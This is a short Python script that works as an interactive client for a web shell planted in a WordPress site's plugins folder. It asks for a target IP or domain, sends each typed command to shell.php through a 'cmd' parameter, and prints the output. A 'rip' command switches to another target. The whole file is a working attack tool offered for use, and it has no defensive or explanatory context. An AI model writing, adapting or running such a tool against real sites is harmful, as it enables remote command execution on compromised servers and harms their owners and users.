#!/usr/bin/python3
# GNU GPLv2 License.
# Convinient. Use "rip" command to replace target.

import requests

targetid = input("Target ip/domain: ")

while True:
    command = input('dolan@pls: ')
    if command == "rip":
        targetid = input("Target ip/domain: ")
        command = input('dolan@pls: ')

    shellget = "http://" + targetid + "/wp-content/plugins/shell/shell.php?cmd="
    req_shellget=str(shellget+command)

    try:
        rv = requests.get(req_shellget)
        print(rv.content)
    except requests.exceptions.Timeout:
        print("Timeout error")
    except:
        print("Connection error")
